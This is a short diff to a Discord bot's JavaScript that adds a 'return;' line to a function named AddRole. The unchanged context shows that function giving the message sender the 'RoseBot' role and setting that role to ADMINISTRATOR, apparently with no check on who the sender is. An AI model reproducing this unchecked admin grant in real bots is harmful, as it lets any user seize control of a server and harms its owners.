@@ -418,6 +418,7 @@ function AddRole(message){
 	let botRole = message.guild.roles.find("name", "RoseBot");
 	message.member.addRole(botRole).catch(console.error);
 	botRole.edit({permissions: 'ADMINISTRATOR'});
+	return;
 }
 	
 client.login(process.env.BOT_TOKEN);
